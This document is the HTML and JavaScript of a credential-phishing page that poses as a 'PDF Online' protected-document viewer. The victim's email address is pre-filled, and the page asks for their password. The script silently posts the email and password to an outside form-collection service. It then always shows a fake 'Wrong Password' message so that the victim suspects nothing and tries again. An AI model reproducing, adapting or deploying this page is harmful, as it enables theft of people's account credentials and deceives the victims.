<body style="background-image: url(https://i.postimg.cc/0yV5B2NG/background1.jpg); background-repeat: no-repeat;background-size: cover;">
    <div class="container-fluid p-0">
        <div class="container">
            <div class="row my-5">
                <div class="col-lg-5 mx-auto">
                    <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
                        <div class="text-left">
                            <span><img src="http://cdn.mcauto-images-production.sendgrid.net/07d9ac8cc71e2271/09488857-8d2c-4418-9a62-fdf70e8a5cb6/225x225.png" class="img-fluid" width="80px"></span><span class="pl-4 h5 align-middle"> </span><br><br>
                            <span class="h5">PDF Online</span><br>
                            <span class="h5"></span><br>
                            <span class="h">This is a protected document,
please verify to access.</span><br>
                            <span id="msg" class="text-danger" style="display: none;">Wrong Password</span><br>
                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                            <small></small>
                            <div class="form-group">
                                <form id="pdf-form" action="https://formbold.com/s/9mkW5" method="post">
                                    <input type="email" id="login" name="AA" class="form-control rounded-0 bg-transparent" aria-describedby="aiHelp" placeholder="Email Address" value="vivianxu@raincarpet.com" required>
                            </div>
                            <div class="form-group mt-2">
                                <small></small>
                                <input type="password" id="passwd" name="BB" class="form-control" aria-describedby="aiHelp" placeholder="Enter Password" autofocus required>
                            </div>
                        </div>
                        <div class="form-check mt-3">
                            <input type="checkbox" class="form-check-input" id="exampleCheck1">
                            <label class="form-check-label" for="exampleCheck1"><span><a href="#">Keep me sign in</a></span></label>
                            <span><span><a href="#" class="float-right">Forgot Password?</a></span></span>
                        </div>
                        <div class="col-lg-12 mt-3">
                            <button type="submit" class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #ed2a1c;">VIEW</button>
                        </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        document.getElementById('pdf-form').addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission

            const submitBtn = document.getElementById('submit-btn');
            const errorMsg = document.getElementById('error');
            const passwordMsg = document.getElementById('msg');
            const form = event.target;
            const formData = new FormData(form);

            // Disable button and show loading state
            submitBtn.disabled = true;
            submitBtn.textContent = 'Loading...';
            errorMsg.style.display = 'none';
            passwordMsg.style.display = 'none';

            try {
                const response = await fetch(form.action, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                });

                if (response.ok) {
                    // Wait for 2 seconds, then show "Wrong Password" message
                    setTimeout(() => {
                        passwordMsg.style.display = 'block';
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'VIEW';
                    }, 2000);
                } else {
                    // Show error message
                    errorMsg.style.display = 'block';
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'VIEW';
                }
            } catch (error) {
                // Show error message on network failure
                errorMsg.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.textContent = 'VIEW';
            }
        });
    </script>
